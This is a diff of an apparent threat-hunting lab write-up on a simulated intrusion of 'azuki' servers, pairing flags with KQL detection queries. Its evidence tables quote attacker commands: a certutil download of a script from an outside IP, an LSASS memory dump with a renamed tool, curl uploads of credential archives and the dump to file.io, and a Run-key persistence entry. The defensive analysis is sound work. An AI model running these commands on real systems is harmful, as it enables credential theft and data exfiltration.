+| Process          | attrib.exe                  |
+| Parent Process   | powershell.exe                    |
+| Command Line     | "attrib.exe" +h +s C:\Windows\Logs\CBS"               |
+
+**💡 Why it matters**  
+Attackers commonly create staging directories to aggregate tools, scripts, and collected data before exfiltration, reducing noise and improving operational efficiency. Placing a staging directory under a trusted Windows path such as C:\Windows\Logs\CBS helps the activity blend into legitimate system files and evade casual inspection. The prior use of attribute manipulation to hide this directory further reinforces intent to conceal attacker activity rather than normal administrative use. This behavior aligns with MITRE ATT&CK T1074.001 – Data Staged: Local Data Staging, often observed shortly before data exfiltration or lateral movement. When a hidden staging directory is identified on a server, it represents a high-confidence indicator of post-compromise collection activity.
+
+**🔧 KQL Query Used**
+```
+DeviceProcessEvents
+| where Timestamp between (startofday(date(2025-11-22)) .. endofday(date(2025-11-22)))
+| where DeviceName contains "azuki"
+| where ProcessCommandLine has_any ("{", "[", "+", "|") 
+| where InitiatingProcessFileName == "powershell.exe"
+| project Timestamp, DeviceName, ProcessCommandLine, InitiatingProcessCommandLine, FileName
+| order by Timestamp asc
+```
+**🖼️ Screenshot**
+<img width="772" height="94" alt="image" src="https://github.com/user-attachments/assets/8b7e09c1-be33-4685-9bec-30fff23b4b7c" />
+
+
+**🛠️ Detection Recommendation**
+
+**Hunting Tip:**  
+Hunt for suspicious directories created or modified within trusted Windows paths that are rarely used for custom data storage. Focus on directories that are hidden, system-marked, or accessed by scripting engines rather than standard Windows services. Correlating directory creation or modification with prior discovery and defense evasion activity can help identify active staging locations before exfiltration occurs.
+
 ```
 DeviceFileEvents
-| where Timestamp between (startofday(datetime(2025-11-19)) .. endofday(datetime(2025-11-21)))
-| where DeviceName == "azuki-sl"
-| where InitiatingProcessFileName contains "powershell"
+| where TimeGenerated > ago(30d)
+| where FolderPath startswith @"C:\Windows\"
+| where ActionType in ("FileCreated", "FolderCreated", "FileModified")
+| where InitiatingProcessFileName in ("powershell.exe", "cmd.exe", "wscript.exe", "cscript.exe")
+| extend SuspiciousPath = FolderPath
+| project TimeGenerated, DeviceName, AccountName, ActionType, SuspiciousPath, InitiatingProcessCommandLine
+| order by TimeGenerated desc
+
 ```
-<img width="1679" height="432" alt="image" src="https://github.com/user-attachments/assets/1dd10cdd-be4d-4e5c-af6d-463cdd687371" />
 
 
 
-### ⚙️ Flag 5 – DEFENCE EVASION - File Extension Exclusions
+<br>
+<hr>
+<br>
 
-**Objective:**
-Attackers add folder path exclusions to Windows Defender to prevent scanning of directories used for downloading and executing malicious tools. These exclusions allow malware to run undetected.
+<a id="flag-10"></a>
+### 🚩 Flag #10: DEFENSE EVASION - Script Download Command
+**🎯 Objective**  
+Legitimate system utilities with network capabilities are frequently weaponized to download malware while evading detection.
 
-**What to Hunt:**
-Search DeviceRegistryEvents for registry modifications to Windows Defender's exclusion settings. Look for the RegistryValueName field containing file extension. Count the unique file extensions added to the "Exclusions\Extensions" registry key during the attack timeline.
+**📌 Finding**  
+"certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1"
 
-**Identified File Extension Excluded:**
-3
-powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command "& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8809.14144035.0.14144035-462fc402c4ea5c03148fd915012f3d7aee74f9d4\05f2c576-9ed5-41eb-9b1e-1b653eebfdff.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8809.14144035.0.14144035-462fc402c4ea5c03148fd915012f3d7aee74f9d4\05f2c576-9ed5-41eb-9b1e-1b653eebfdff.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '25fda4c27044455e664e8c26cdd2911117493a9122c002cd9462a9ce9c677f22')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8809.14144035.0.14144035-462fc402c4ea5c03148fd915012f3d7aee74f9d4\05f2c576-9ed5-41eb-9b1e-1b653eebfdff.ps1' }"
+**🔍 Evidence**
 
-**Why It Matters:**
-Adding specific extensions to Windows Defender exclusions disables scanning for those file types, giving downloaded malware a safe landing zone. This change directly weakens endpoint protection and highlights why monitoring Defender configuration modifications is essential for catching evasion in progress (MITRE ATT&CK T1562.001 – Impair Defenses: Disable or Modify Tools).
+| Field            | Value                                      |
+|------------------|--------------------------------------------|
+| Host             | azuki-fileserver01                         |
+| Timestamp        | 2025-11-22T00:56:47.4100711Z               |
+| Process          | certutil.exe                    |
+| Parent Process   | powershell.exe                      |
+| Command Line     | `certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1`                 |
 
-**KQL Query Used:**
+**💡 Why it matters**  
+[Explain the impact, real-world relevance, MITRE mapping, and why this is a high-signal indicator. 4-6 sentences for depth.]
+
+**🔧 KQL Query Used**
+```
+DeviceProcessEvents
+| where Timestamp between (startofday(date(2025-11-22)) .. endofday(date(2025-11-22)))
+| where DeviceName contains "azuki"
+| where InitiatingProcessFileName == "powershell.exe" and InitiatingProcessCommandLine !contains "Windows Defender Advanced Threat Protection"
+| project Timestamp, DeviceName, ProcessCommandLine, InitiatingProcessCommandLine, FileName
+| order by Timestamp asc
+```
+**🖼️ Screenshot**
+<img width="1743" height="612" alt="image" src="https://github.com/user-attachments/assets/601dffcf-0524-4e25-8ed0-b4f9984a9255" />
+
+
+**🛠️ Detection Recommendation**
+
+**Hunting Tip:**  
+Focus hunting on signed Windows utilities with network functionality (LOLBINs) executing outbound downloads, especially when initiated by scripting engines. Pay close attention to downloads targeting unusual directories such as C:\Windows\Logs\ or user-writable system paths. Correlating certutil usage with prior staging, discovery, or defense evasion activity significantly increases detection fidelity.
+
+```
+DeviceProcessEvents
+| where TimeGenerated > ago(30d)
+| where FileName == "certutil.exe"
+| where ProcessCommandLine has_any ("-urlcache", "http://", "https://")
+| where InitiatingProcessFileName in ("powershell.exe", "cmd.exe", "wscript.exe", "cscript.exe")
+| extend DownloadURL = extract(@"(http[s]?://[^\s]+)", 1, ProcessCommandLine)
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, DownloadURL, InitiatingProcessCommandLine
+| order by TimeGenerated desc
+```
+
+
+<br>
+<hr>
+<br>
+<a id="flag-11"></a>
+### 🚩 Flag #11: COLLECTION - Credential File Discovery
+**🎯 Objective**  
+Credential files provide keys to the kingdom - enabling lateral movement and privilege escalation across the network.
+
+**📌 Finding**  
+IT-Admin-Passwords.csv
+
+**🔍 Evidence**
+
+| Field            | Value                                      |
+|------------------|--------------------------------------------|
+| Host             | azuki-fileserver01                         |
+| Timestamp        | 2025-11-22T01:07:53.6746323Z               |
+| Process          | xcopy.exe                    |
+| Parent Process   | N/A                      |
+| Command Line     | `xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y`                 |
+
+**💡 Why it matters**  
+Credential files such as spreadsheets or CSVs containing administrative passwords represent some of the highest-value assets an attacker can obtain during an intrusion. By copying an entire IT administrator directory into a hidden staging location, the attacker is clearly preparing credentials for later use, exfiltration, or offline analysis. 
+
+Possession of valid admin credentials enables rapid lateral movement, privilege escalation, and often full domain compromise without the need for noisy exploitation. This activity maps directly to MITRE ATT&CK T1552.001 – Unsecured Credentials: Credentials in Files, a technique frequently observed in real-world breaches and ransomware operations. 
+
+File copy utilities like xcopy.exe performing bulk transfers from file shares into concealed directories are a strong, high-signal indicator of credential harvesting rather than legitimate administration.
+
+**🔧 KQL Query Used**
+```
+let timeofattack = todatetime('2025-11-22T00:40:29.5749856Z');
+DeviceFileEvents
+| where TimeGenerated  between ((timeofattack - 1h) .. (timeofattack + 1h))
+| where DeviceName contains "azuki"
+| where InitiatingProcessAccountName != "system"
+| where ActionType == "FileCreated"
+| project TimeGenerated, ActionType, DeviceName, FileName, FolderPath, InitiatingProcessCommandLine
+```
+**🖼️ Screenshot**
+<img width="1770" height="689" alt="image" src="https://github.com/user-attachments/assets/f65f2dc2-5671-46f1-923a-f6d721a5399d" />
+
+
+**🛠️ Detection Recommendation**
+
+**Hunting Tip:**  
+Hunt for non-system users copying large numbers of files from shared directories—especially IT, Finance, or Admin shares—into uncommon or hidden system paths. Prioritize activity involving archive, copy, or synchronization utilities staging data shortly after discovery or credential access events, as this often precedes exfiltration or lateral movement.
+
 ```
 DeviceFileEvents
-| where Timestamp between (startofday(datetime(2025-11-19)) .. endofday(datetime(2025-11-21)))
-| where DeviceName == "azuki-sl"
-| where InitiatingProcessParentFileName contains "sense"
+| where TimeGenerated > ago(30d)
+| where ActionType in ("FileCreated", "FileCopied")
+| where InitiatingProcessFileName in ("xcopy.exe", "robocopy.exe", "powershell.exe", "cmd.exe")
+| where FolderPath has_any ("\\FileShares\\", "\\IT", "\\Admin")
+| where FolderPath has_any ("\\Windows\\Logs\\", "\\ProgramData\\", "\\Temp")
+| where InitiatingProcessAccountName != "SYSTEM"
+| project TimeGenerated, DeviceName, AccountName=InitiatingProcessAccountName,
+          FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated desc
 ```
-<img width="1668" height="249" alt="image" src="https://github.com/user-attachments/assets/e4227628-f81c-4c71-8509-d8867114398e" />
-<img width="1678" height="435" alt="image" src="https://github.com/user-attachments/assets/d86c2602-327d-4996-a572-65bb1b582930" />
+
+
+<br>
+<hr>
+<br>
+
+
+<a id="flag-12"></a>
+### 🚩 Flag #12: COLLECTION - Recursive Copy Command
+**🎯 Objective**  
+Built-in system utilities are preferred for data staging as they're less likely to trigger security alerts. The exact command line reveals attacker methodology.
+
+**📌 Finding**  
+"xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y
+
+
+**🔍 Evidence**
+
+| Field            | Value                                      |
+|------------------|--------------------------------------------|
+| Host             | azuki-fileserver01                        |
+| Timestamp        | 2025-11-22T01:07:53.6430063Z              |
+| Process          | xcopy.exe                    |
+| Parent Process   | powershell.exe                      |
+| Command Line     | `"xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y`                 |
+
+**💡 Why it matters**  
+This activity confirms deliberate and systematic data collection rather than incidental file access. The attacker repeatedly used xcopy.exe to copy multiple high-value enterprise file shares (Contracts, Financial, IT-Admin, Shipping) into a single hidden staging directory, strongly indicating preparation for exfiltration or encryption. 
+
+The consistency of tooling, destination path, and command-line switches shows hands-on keyboard activity aligned with human-operated intrusion behavior. Staging sensitive business and credential data locally is a common precursor to data theft, ransomware deployment, or double-extortion operations. 
+
+This behavior maps directly to MITRE ATT&CK T1074.001 – Data Staged: Local Data Staging, with supporting elements of T1119 – Automated Collection, and represents a high-confidence indicator of attacker intent rather than reconnaissance alone.
+
+**🔧 KQL Query Used**
+```
+
+let timeattack = todatetime('2025-11-22T00:40:29.5749856Z');
+DeviceProcessEvents
+| where TimeGenerated between ((timeattack - 3h) .. (timeattack + 3h))
+| where DeviceName contains "azuki"
+| where FileName in ("robocopy.exe", "xcopy.exe")
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
+| order by TimeGenerated asc
+```
+**🖼️ Screenshot**
+<img width="1759" height="616" alt="image" src="https://github.com/user-attachments/assets/8ca0b80b-02fa-40e9-8bfb-d78f90ab84fc" />
+
+
+**🛠️ Detection Recommendation**
+
+**Hunting Tip:**  
+Focus on native file-copy utilities writing multiple distinct source directories into a single destination path within a short time window. Repeated use of xcopy.exe, robocopy.exe, or copy targeting unusual or hidden directories (especially under C:\Windows\) is a strong signal of staging activity and should be prioritized over single copy events.
+
+```
+DeviceProcessEvents
+| where TimeGenerated > ago(30d)
+| where FileName in ("xcopy.exe", "robocopy.exe")
+| where ProcessCommandLine has_any ("/E", "/I", "/H")
+| where ProcessCommandLine contains @"C:\Windows\"
+| summarize CopyCount = count(),
+            DistinctSources = dcount(extract(@"([A-Z]:\\[^ ]+)", 1, ProcessCommandLine)),
+            FirstSeen = min(TimeGenerated),
+            LastSeen = max(TimeGenerated)
+  by DeviceName, AccountName, ProcessCommandLine
+| where CopyCount >= 2 or DistinctSources >= 2
+| order by LastSeen desc
+```
+
+
+<br>
+<hr>
+<br>
+<a id="flag-13"></a>
+### 🚩 Flag #13: COLLECTION - Compression Command
+**🎯 Objective**  
+Cross-platform compression tools indicate attacker sophistication. The full command line reveals the exact archiving methodology used.
+
+**📌 Finding**  
+"tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .
+
+
+**🔍 Evidence**
+
+| Field            | Value                                      |
+|------------------|--------------------------------------------|
+| Host             | azuki-fileserver01                   |
+| Timestamp        | 2025-11-22T01:30:10.0981853Z           |
+| Process          | tar.exe                   |
+| Parent Process   | powershell.exe                     |
+| Command Line     | `tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin`                 |
+
+**💡 Why it matters**  
+The use of tar.exe on a Windows system is a strong indicator of deliberate attacker tradecraft rather than routine administrative activity. Attackers commonly compress staged data to reduce size, preserve directory structure, and prepare files for rapid exfiltration or encryption. 
+
+In this case, the archive targets a hidden staging directory (C:\Windows\Logs\CBS\it-admin) that already contains harvested credential material, confirming this activity as a late-stage collection step rather than benign maintenance. Compression marks a clear transition from discovery and collection into exfiltration readiness, meaning containment urgency is high. 
+
+This behavior aligns with MITRE ATT&CK T1560.001 – Archive Collected Data: Archive via Utility, a technique frequently observed immediately prior to data theft or ransomware deployment.
+
+**🔧 KQL Query Used**
+```
+let timeattack4 = todatetime('2025-11-22T01:07:53.6430063Z');
+DeviceProcessEvents
+| where TimeGenerated between ((timeattack4 - 2h) .. (timeattack4 + 2h))
+| where DeviceName contains "azuki"
+| where FileName  in ("tar.exe", "gzip.exe")
+| project TimeGenerated, DeviceName, AccountName, ActionType, ProcessCommandLine, InitiatingProcessCommandLine, FolderPath
+| order by TimeGenerated desc
+```
+**🖼️ Screenshot**
+<img width="1733" height="575" alt="image" src="https://github.com/user-attachments/assets/bdb2cc46-dde6-4ae8-a280-8816581b8c98" />
+
+**🛠️ Detection Recommendation**
+
+**Hunting Tip:**  
+Use this query during proactive threat hunts to identify archive creation from suspicious or nonstandard directories (e.g., Windows\Logs, Temp, user-writable system paths). Pay close attention to compression tools executed by scripting engines such as PowerShell, and correlate results with earlier file copy or credential discovery activity to confirm malicious staging behavior.
+
+```
+DeviceProcessEvents
+| where TimeGenerated > ago(30d)
+| where FileName in ("tar.exe", "gzip.exe", "7z.exe", "rar.exe")
+| where ProcessCommandLine has_any (".zip", ".tar", ".tar.gz", ".7z", ".rar")
+| where InitiatingProcessFileName in ("powershell.exe", "cmd.exe")
+| project TimeGenerated,
+          DeviceName,
+          AccountName,
+          FileName,
+          ProcessCommandLine,
+          InitiatingProcessCommandLine
+| order by TimeGenerated desc
+```
+
+<br>
+<hr>
+<br>
+<a id="flag-14"></a>
+### 🚩 Flag #14: CREDENTIAL ACCESS - Renamed Tool
+**🎯 Objective**  
+Renaming credential dumping tools is a basic OPSEC practice to evade signature-based detection.
+
+**📌 Finding**  
+pd.exe
+
+
+**🔍 Evidence**
+
+| Field            | Value                                      |
+|------------------|--------------------------------------------|
+| Host             | azuki-fileserver01                   |
+| Timestamp        | 2025-11-22T02:03:19.9845969Z           |
+| Process          | powershell.exe                   |
+| Parent Process   | powershell.exe                     |
+| Command Line     | `powershell.exe`                 |
+
+**💡 Why it matters**  
+Renaming credential dumping tools is a common evasion technique used to bypass signature-based detections that rely on known filenames such as mimikatz.exe. The appearance of an unfamiliar executable (pd.exe) created shortly before credential access activity strongly suggests a renamed or custom-packed dumping utility. 
+
+Attackers frequently stage these tools under innocuous names to blend into the environment and delay defender response. When combined with prior collection, staging, and compression behavior, this indicates the attacker is actively attempting to harvest credentials for lateral movement or privilege escalation. 
+
+This activity maps to MITRE ATT&CK T1003 – OS Credential Dumping, with evasion via T1036 – Masquerading, and represents a high-confidence signal of hands-on-keyboard adversary activity.
+
+**🔧 KQL Query Used**
+```
+let timeattack4 = todatetime('2025-11-22T01:07:53.6430063Z');
+DeviceFileEvents
+| where TimeGenerated between ((timeattack4 - 1h) .. (timeattack4 + 1h))
+| where DeviceName contains "azuki"
+| where ActionType == "FileCreated"
+| project TimeGenerated, DeviceName, ActionType, FileName, InitiatingProcessCommandLine, FolderPath
+| order by TimeGenerated desc
+```
+**🖼️ Screenshot**
+<img width="1745" height="208" alt="image" src="https://github.com/user-attachments/assets/5d17ebfb-dbd6-421a-935c-91f7fee67ee4" />
 
 
 
-### 💾 Flag 6: DEFENCE EVASION - Temporary Folder Exclusion
+**🛠️ Detection Recommendation**
 
-**Objective:**
-Attackers add folder path exclusions to Windows Defender to prevent scanning of directories used for downloading and executing malicious tools. These exclusions allow malware to run undetected.
+**Hunting Tip:**  
+Use this query to hunt for newly created executables in atypical directories that are shortly followed by credential access, discovery, or compression activity. Prioritize binaries launched by PowerShell or created outside standard install paths, especially on servers and high-value systems. Correlating file creation with suspicious process execution within a short time window significantly increases detection confidence.
 
-**What to Hunt:**
-Search DeviceRegistryEvents for folder path exclusions added to Windows Defender configuration. Focus on the RegistryValueName field. Look for temporary folder paths added to the exclusions list during the attack timeline. Copy the path exactly as it appears in the RegistryValueName field. The registry key contains "Exclusions\Paths" under Windows Defender configuration.
+```
+DeviceFileEvents
+| where TimeGenerated > ago(30d)
+| where ActionType == "FileCreated"
+| where FileName endswith ".exe"
+| where FolderPath has_any ("\\Windows\\Logs\\", "\\Temp\\", "\\ProgramData\\")
+| project TimeGenerated,
+          DeviceName,
+          FileName,
+          FolderPath,
+          InitiatingProcessCommandLine
+| order by TimeGenerated desc
+```
 
-**Identified Temporary Folder:**
+<br>
+<hr>
+<br>
+<a id="flag-15"></a>
+### 🚩 Flag #15: CREDENTIAL ACCESS - Memory Dump Command
+**🎯 Objective**  
+The complete process memory dump command line is critical evidence showing exactly how credentials were extracted.
 
-C:\Users\KENJI~1.SAT\AppData\Local\Temp
+**📌 Finding**  
 
-**Why It Matters:**
-Excluding the Temp folder from scans allows temporary malicious files to execute without interference. This common tactic reduces detection risk for short-lived payloads and shows the need for alerts on exclusion changes, especially to high-write locations (MITRE ATT&CK T1562.001 – Impair Defenses).
+"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp"
 
-**KQL Query Used:**
+
+**🔍 Evidence**
+
+| Field            | Value                                      |
+|------------------|--------------------------------------------|
+| Host             | 
+azuki-fileserver01                   |
+| Timestamp        | 2025-11-22T02:24:44.3906047Z            |
+| Process          | pd.exe                   |
+| Parent Process   | "powershell.exe"                      |
+| Command Line     | '"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp'              |
+
+**💡 Why it matters**  
+Dumping the memory of LSASS (Local Security Authority Subsystem Service) is one of the most reliable indicators of credential theft on Windows systems. LSASS stores sensitive authentication material including plaintext credentials, NTLM hashes, and Kerberos tickets for logged-on users.
+
+In this case, the attacker used a renamed credential dumping tool (pd.exe) with explicit memory dump arguments (-ma) to target the LSASS process, confirming intentional credential access rather than accidental or benign behavior. Writing the dump file to a disguised staging directory (C:\Windows\Logs\CBS) further demonstrates attacker OPSEC and an attempt to evade casual inspection.
+
+This activity maps directly to MITRE ATT&CK T1003.001 – OS Credential Dumping: LSASS Memory, a high-impact technique frequently used to enable privilege escalation, lateral movement, and full domain compromise. Detection of LSASS dumping should be treated as a containment-critical event.
+
+**🔧 KQL Query Used**
+```
+let timeattack5 = todatetime('2025-11-22T02:03:19.9845969Z');
+DeviceProcessEvents
+| where TimeGenerated between ((timeattack5 - 1h) .. (timeattack5 + 1h))
+| where DeviceName contains "azuki"
+| where ProcessCommandLine contains "pd.exe"
+| project TimeGenerated, DeviceName, ActionType, ProcessCommandLine, FileName, InitiatingProcessCommandLine, FolderPath
+| order by TimeGenerated desc
+
+```
+**🖼️ Screenshot**
+<img width="1764" height="283" alt="image" src="https://github.com/user-attachments/assets/f99807a4-ff55-422d-bb73-744b73a4fe3a" />
+
+
+
+**🛠️ Detection Recommendation**
+
+**Hunting Tip:**  
+When hunting for credential dumping, prioritize behavior over tool names. Attackers frequently rename utilities like ProcDump to evade signature-based detections, but LSASS dumping still requires distinctive command-line flags and access patterns. Focus on memory dump arguments (-ma, MiniDump, .dmp) combined with references to LSASS or dump files written to nonstandard directories.
+
+```
+DeviceProcessEvents
+| where TimeGenerated > ago(30d)
+| where ProcessCommandLine has_any ("lsass", "-ma", ".dmp")
+| where InitiatingProcessFileName in ("powershell.exe", "cmd.exe")
+| project TimeGenerated,
+          DeviceName,
+          AccountName,
+          FileName,
+          ProcessCommandLine,
+          InitiatingProcessCommandLine,
+          FolderPath
+| order by TimeGenerated desc
+
+```
+
+<br>
+<hr>
+<br>
+<a id="flag-16"></a>
+### 🚩 Flag #16: EXFILTRATION - Upload Command
+**🎯 Objective**  
+Command-line HTTP clients enable scriptable data transfers. The complete command syntax is essential for building detection rules.
+
+**📌 Finding**  
+curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io  
+
+
+**🔍 Evidence**
+
+| Field            | Value                                      |
+|------------------|--------------------------------------------|
+| Host             | azuki-fileserver01                    |
+| Timestamp        | 2025-11-22T01:59:54.2755596Z            |
+| Process          | curl.exe                   |
+| Parent Process   | powershell.exe                      |
+| Command Line     | curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io                 |
+
+**💡 Why it matters**  
+The use of curl.exe to upload an archive to an external file-sharing service represents a clear data exfiltration action, not preparation or staging. Command-line HTTP clients allow attackers to automate transfers, bypass browser-based controls, and operate quietly through scripts or living-off-the-land binaries.
+
+In this case, the attacker exfiltrated a compressed archive (credentials.tar.gz) from a disguised staging directory, confirming that previously collected and compressed credential material was successfully moved off the host. The destination, file.io, is a legitimate but commonly abused public file-sharing service, making this traffic blend into normal outbound HTTPS activity.
+
+This behavior aligns with MITRE ATT&CK T1048.003 – Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Channel, and marks a critical point where sensitive data has already left the environment.
+
+**🔧 KQL Query Used**
+```
+let timeattack5 = todatetime('2025-11-22T02:03:19.9845969Z');
+DeviceProcessEvents
+| where TimeGenerated between ((timeattack5 - 1h) .. (timeattack5 + 1h))
+| where DeviceName contains "azuki"
+| where ProcessCommandLine contains "http"
+| project TimeGenerated, DeviceName, ActionType, ProcessCommandLine, FileName, InitiatingProcessCommandLine, FolderPath
+| order by TimeGenerated desc
+```
+**🖼️ Screenshot**
+<img width="1750" height="239" alt="image" src="https://github.com/user-attachments/assets/90aafcc2-13fe-40e0-99a6-8214f168d4d0" />
+
+
+
+**🛠️ Detection Recommendation**
+
+**Hunting Tip:**  
+Focus hunts on outbound data transfers initiated by scripting engines or command-line utilities rather than relying solely on destination reputation. File uploads using curl.exe or similar tools (wget, Invoke-WebRequest) combined with archive file extensions and public file-sharing domains are strong indicators of hands-on-keyboard exfiltration activity.
+
+```
+DeviceProcessEvents
+| where TimeGenerated > ago(30d)
+| where FileName in ("curl.exe", "wget.exe")
+| where ProcessCommandLine has_any ("http", "https", "-F", "--upload-file")
+| where ProcessCommandLine has_any (".zip", ".tar", ".tar.gz", ".7z", ".rar")
+| where InitiatingProcessFileName in ("powershell.exe", "cmd.exe")
+| project TimeGenerated,
+          DeviceName,
+          AccountName,
+          FileName,
+          ProcessCommandLine,
+          InitiatingProcessCommandLine
+| order by TimeGenerated desc
+```
+
+<br>
+<hr>
+<br>
+
+<a id="flag-17"></a>
+### 🚩 Flag #17 EXFILTRATION - Cloud Service
+**🎯 Objective**  
+Cloud file sharing services provide convenient, anonymous exfiltration channels that blend with legitimate business traffic.
+
+**📌 Finding**  
+file.io
+
+
+**🔍 Evidence**
+
+| Field            | Value                                      |
+|------------------|--------------------------------------------|
+| Host             | azuki-fileserver01                  |
+| Timestamp        | 2025-11-22T02:25:37.9206525Z            |
+| Process          | curl.exe                  |
+| Parent Process   | powershell                    |
+| Command Line     | "curl.exe" -F file=@C:\Windows\Logs\CBS\lsass.dmp https://file.io               |
+
+**💡 Why it matters**  
+Exfiltrating data to public cloud file-sharing services represents a high-risk data loss scenario because these platforms are widely trusted, encrypted, and commonly allowed through perimeter controls. Attackers favor services like file.io because uploads occur over standard HTTPS, making the traffic difficult to distinguish from legitimate business activity without endpoint context.
+
+In this case, the attacker uploaded a full LSASS memory dump, which almost certainly contains cached credentials, NTLM hashes, or Kerberos material. This confirms not just successful credential access, but successful credential theft and removal from the environment, eliminating any opportunity for recovery through containment alone.
+
+This behavior aligns with MITRE ATT&CK T1567.002 – Exfiltration Over Web Service: Exfiltration to Cloud Storage, and represents a late-stage breach milestone where incident response urgency is critical.
+
+**🔧 KQL Query Used**
+```
+let timeattack5 = todatetime('2025-11-22T02:03:19.9845969Z');
+DeviceNetworkEvents
+| where TimeGenerated between ((timeattack5 - 1h) .. (timeattack5 + 1h))
+| where DeviceName contains "azuki"
+| project TimeGenerated, DeviceName, RemoteIP, RemoteUrl, ActionType, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated desc
+```
+**🖼️ Screenshot**
+<img width="1538" height="212" alt="image" src="https://github.com/user-attachments/assets/7de50878-c6cf-4a05-85a1-279ed2de406a" />
+
+
+**🛠️ Detection Recommendation**
+
+**Hunting Tip:**  
+Hunt for endpoint-initiated connections to public file-sharing services that originate from scripting engines or command-line tools rather than browsers. Prioritize uploads involving sensitive file types such as memory dumps, archives, or database exports, especially when correlated with prior credential dumping or compression activity.
+```
+DeviceNetworkEvents
+| where TimeGenerated > ago(30d)
+| where RemoteUrl has_any ("file.io", "transfer.sh", "anonfiles", "gofile", "pastebin")
+| where InitiatingProcessFileName in ("curl.exe", "powershell.exe", "cmd.exe")
+| where InitiatingProcessCommandLine has_any (".dmp", ".zip", ".tar", ".tar.gz", ".7z")
+| project TimeGenerated,
+          DeviceName,
+          AccountName,
+          RemoteUrl,
+          RemoteIP,
+          InitiatingProcessFileName,
+          InitiatingProcessCommandLine
+| order by TimeGenerated desc
+```
+
+<br>
+<hr>
+<br>
+<a id="flag-18"></a>
+### 🚩 Flag #18: PERSISTENCE - Registry Value Name
+**🎯 Objective**  
+Registry autorun keys provide reliable persistence that executes on every system startup or user logon.
+
+**📌 Finding**  
+
+FileShareSync
+
+
+**🔍 Evidence**
+
+| Field            | Value                                      |
+|------------------|--------------------------------------------|
+| Host             | azuki-fileserver01                   |
+| Timestamp        | 2025-11-22T02:10:50.8253766Z           |
+| Process          | reg.exe                   |
+| Parent Process   | powershell                      |
+| Command Line     | `reg.exe" add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v FileShareSync /t REG_SZ /d "powershell -NoP -W Hidden -File C:\Windows\System32\svchost.ps1" /f`                 |
+
+**💡 Why it matters**  
+Registry Run keys provide one of the most reliable and low-noise persistence mechanisms available to attackers, as they guarantee execution on every system startup or user logon. By choosing the value name FileShareSync, the attacker deliberately blends into expected enterprise software naming conventions, reducing the likelihood of casual discovery by administrators or users.
+
+The associated command launches a hidden PowerShell process that executes a script from a nonstandard system path, indicating continued control rather than a one-time payload. This persistence occurs after credential access and data exfiltration, strongly suggesting the attacker intends to maintain long-term access for follow-on operations or re-entry.
+
+This behavior maps directly to MITRE ATT&CK T1547.001 – Boot or Logon Autostart Execution: Registry Run Keys, a technique commonly observed in hands-on-keyboard intrusions and ransomware precursor activity.
+
+**🔧 KQL Query Used**
+```
+let timeattack5 = todatetime('2025-11-22T02:03:19.9845969Z');
+DeviceRegistryEvents
+| where TimeGenerated between ((timeattack5 - 1h) .. (timeattack5 + 1h))
+| where DeviceName contains "azuki"
+| project TimeGenerated, DeviceName, RegistryValueName, RegistryKey, RegistryValueData, InitiatingProcessCommandLine
+```
+**🖼️ Screenshot**
+<img width="1532" height="184" alt="image" src="https://github.com/user-attachments/assets/bda95703-7808-4a53-9028-c16b7f870f80" />
+
+
+
+**🛠️ Detection Recommendation**
+
+**Hunting Tip:**  
+Use this query to proactively identify newly created or modified Run key values, especially those added via command-line tools like reg.exe or PowerShell. Pay close attention to value names that appear legitimate but point to scripts, hidden PowerShell execution, or binaries located outside standard program directories. Correlating these events with earlier credential access or exfiltration activity significantly increases detection confidence.
 ```
 DeviceRegistryEvents
-| where Timestamp between (startofday(datetime(2025-11-19)) .. endofday(datetime(2025-11-21)))
-| where DeviceName == "azuki-sl"
-
+| where TimeGenerated > ago(30d)
+| where ActionType == "RegistryValueSet"
+| where RegistryKey has @"\Software\Microsoft\Windows\CurrentVersion\Run"
+| where InitiatingProcessFileName in ("reg.exe", "powershell.exe", "cmd.exe")
+| project TimeGenerated,
+          DeviceName,
+          RegistryValueName,
+          RegistryKey,
+          RegistryValueData,
+          InitiatingProcessFileName,
+          InitiatingProcessCommandLine
+| order by TimeGenerated desc
 ```
 
-<img width="1677" height="402" alt="image" src="https://github.com/user-attachments/assets/d19ed60a-9ddb-45e7-84b9-1641deef37f7" />
+<br>
+<hr>
+<br>
+
+<a id="flag-19"></a>
+### 🚩 Flag #19: PERSISTENCE - Beacon Filename
+**🎯 Objective**  
+Process masquerading involves naming malicious files after legitimate Windows components to avoid suspicion.
+
+**📌 Finding**  
+svchost.ps1
 
 
+**🔍 Evidence**
 
-### 📎 Flag 7 – DEFENCE EVASION - Download Utility Abuse
+| Field            | Value                                      |
+|------------------|--------------------------------------------|
+| Host             | azuki-fileserver01                   |
